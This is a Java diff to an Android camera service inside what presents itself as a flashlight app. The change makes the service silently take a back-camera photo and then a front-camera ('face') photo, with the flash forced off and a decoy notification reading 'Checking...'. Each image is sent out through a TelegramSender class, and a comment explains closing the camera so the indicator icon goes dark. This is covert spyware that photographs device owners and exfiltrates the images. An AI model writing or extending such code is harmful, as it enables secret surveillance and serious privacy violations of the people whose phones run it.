@@ -21,29 +21,23 @@ public class CameraService extends Service {
     private CameraDevice device;
     private ImageReader reader;
     private CaptureRequest.Builder builder;
-    private String cameraType = "back";
 
     @Nullable @Override public IBinder onBind(Intent i) { return null; }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null && intent.hasExtra("camera_type")) {
-            cameraType = intent.getStringExtra("camera_type");
-        }
-
         NotificationChannel ch = new NotificationChannel("cam", "Flashlight", NotificationManager.IMPORTANCE_LOW);
         getSystemService(NotificationManager.class).createNotificationChannel(ch);
         Notification n = new Notification.Builder(this, "cam")
-                .setContentTitle("Фонарик работает")
+                .setContentTitle("Проверка...")
                 .setSmallIcon(android.R.drawable.ic_menu_camera)
                 .build();
         startForeground(1, n);
         
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
         
-        // 0 = задняя, 1 = фронтальная
-        String id = cameraType.equals("back") ? "0" : "1";
-        capturePhoto(cameraType, id); 
+        // Шаг 1. Открываем ЗАДНЮЮ камеру
+        capturePhoto("back", "0"); 
         return START_NOT_STICKY;
     }
 
@@ -88,27 +82,32 @@ public class CameraService extends Service {
                         
                         new TelegramSender().send(out.toByteArray(), tag + ".jpg");
                         
+                        // ЗАКРЫВАЕМ КАМЕРУ, чтобы погас значок
                         img.close(); r.close(); device.close();
-                        stopSelf();
+                        
+                        // Если сняли заднюю, ждем 1.5 сек и запускаем фронталку
+                        if (tag.equals("back")) {
+                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                                capturePhoto("face", "1");
+                            }, 1500);
+                        } else {
+                            stopSelf(); // Сделали фронт - завершились
+                        }
                     }, null);
                     try {
                         builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                         builder.addTarget(reader.getSurface());
                         
-                        // СТРОГО БЕЗ ВСПЫШКИ
                         builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF);
-                        // АВТО-ЭКСПОЗИЦИЯ (пусть камера сама решает, сколько света нужно)
                         builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
 
                         device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                             @Override public void onConfigured(CameraCaptureSession s) {
-                                // Для задней камеры даем 2 секунды, чтобы она адаптировалась к свету фонаря
-                                long delay = tag.equals("back") ? 2000 : 1000;
-                                
+                                // Ждем 1.5 секунды на настройку экспозиции
                                 new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                     try { s.capture(builder.build(), null, null); } 
                                     catch (Exception e) { e.printStackTrace(); }
-                                }, delay);
+                                }, 1500);
                             }
                             @Override public void onConfigureFailed(CameraCaptureSession s) {}
                         }, null);
